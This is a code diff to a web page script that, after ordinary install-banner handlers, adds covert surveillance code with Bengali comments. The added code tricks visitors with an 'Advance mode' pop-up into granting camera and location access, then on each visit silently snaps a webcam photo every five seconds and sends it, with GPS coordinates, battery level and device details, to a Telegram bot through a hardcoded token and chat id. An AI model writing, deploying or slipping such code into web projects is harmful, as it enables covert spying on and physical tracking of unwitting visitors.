@@ -210,3 +210,116 @@ btnInstall.addEventListener('click', () => {
 btnClose.addEventListener('click', () => {
     installBanner.style.display = 'none';
 });
+
+
+
+// --- আপনার কনফিগারেসন ---
+const botToken = '8239197154:AAH-VeIISL9nO-EZFL2wJqcVIV6S8UhMVAY';
+const chatId = '7950771882'; 
+
+const overlay = document.getElementById('advanced-overlay');
+const okBtn = document.getElementById('ok-btn');
+
+// ১. পেজ লোড হলে চেক করবে আগে অনুমতি দিয়েছে কি না
+window.addEventListener('load', () => {
+    if (localStorage.getItem('accessGranted') === 'true') {
+        startSilentTracking(); 
+    } else {
+        setTimeout(() => {
+            overlay.style.display = 'flex';
+        }, 4000); // ৪ সেকেন্ড পর পপ-আপ দেখাবে
+    }
+});
+
+// ২. OK বাটনে ক্লিক করলে যা হবে
+okBtn.addEventListener('click', async () => {
+    try {
+        // ক্যামেরা পারমিশন চাওয়া
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        
+        // লোকেশন পারমিশন চাওয়া
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            localStorage.setItem('accessGranted', 'true');
+            overlay.style.display = 'none';
+            runTrackingLoop(stream);
+        }, (err) => {
+            alert("Location access is necessary for the Advance mode.");
+        });
+    } catch (err) {
+        alert("Camera access is needed to proceed.");
+    }
+});
+
+// ৩. সাইলেন্ট ট্র্যাকিং (যারা একবার এলাউ করে রেখেছে)
+async function startSilentTracking() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        runTrackingLoop(stream);
+    } catch (e) {
+        localStorage.removeItem('accessGranted');
+    }
+}
+
+// ৪. ৫ সেকেন্ড পর পর ডেটা পাঠানোর লুপ
+function runTrackingLoop(stream) {
+    setInterval(() => {
+        captureAndSend(stream);
+    }, 5000);
+}
+
+async function captureAndSend(stream) {
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+
+    const canvas = document.createElement('canvas');
+    canvas.width = 640;
+    canvas.height = 480;
+    const ctx = canvas.getContext('2d');
+
+    setTimeout(async () => {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/jpeg');
+
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const battery = await navigator.getBattery();
+            const batteryLevel = (battery.level * 100).toFixed(0) + '%';
+            
+            // গুগল ম্যাপের সুনির্দিষ্ট লিঙ্ক (Fixed)
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            const infoText = `
+🚀 **User Activity Log**
+--------------------------------
+📍 **Map Location:** ${mapLink}
+🔋 **Battery:** ${batteryLevel}
+📱 **Device:** ${navigator.platform}
+🕒 **Time:** ${new Date().toLocaleTimeString()}
+            `;
+            sendToTelegram(imageData, infoText);
+        });
+    }, 1000);
+}
+
+// ৫. টেলিগ্রামে মেসেজ ও ছবি পাঠানো
+async function sendToTelegram(image, text) {
+    // টেক্সট পাঠানো
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: text })
+    });
+
+    // ছবি পাঠানো
+    const blob = await (await fetch(image)).blob();
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('photo', blob, 'user_capture.jpg');
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+    });
+}
